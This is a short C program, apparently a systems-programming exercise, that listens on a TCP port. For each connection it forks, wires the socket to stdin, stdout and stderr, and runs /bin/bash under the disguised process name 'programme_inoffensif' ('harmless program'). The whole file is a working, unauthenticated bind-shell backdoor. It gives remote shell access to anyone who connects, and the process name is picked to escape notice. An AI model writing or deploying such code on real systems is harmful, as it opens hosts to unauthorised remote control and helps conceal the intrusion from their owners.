#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#include "utils.h"

#define BACKLOG 1
#define BUFFERSIZE 1000

volatile sig_atomic_t end = 0;

void endServerHandler(int sig)
{
    end = 1;
}

int socketServer(int serverPort)
{
    int sockfd = ssocket();
    sbind(serverPort, sockfd);
    slisten(sockfd, BACKLOG);
    return sockfd;
}

int main(int argc, char **argv)
{
    int port = atoi(argv[1]);

    ssigaction(SIGTERM, endServerHandler);
    ssigaction(SIGINT, endServerHandler);

    int sockfd = -1;
    sockfd = socketServer(port);

    while (!end)
    {
        int newsockfd = accept(sockfd, NULL, NULL);

        if (end)
            break;

        checkNeg(newsockfd, "ERROR accept");

        int pid_shell = sfork();

        if (pid_shell == 0)
        {
            
            dup2(newsockfd, 0);
            dup2(newsockfd, 1);
            dup2(newsockfd, 2);

            close(newsockfd);

            sexecl("/bin/bash", "programme_inoffensif", NULL);

            perror("exec failed");
            exit(1);
        }


    }

    sclose(sockfd);
}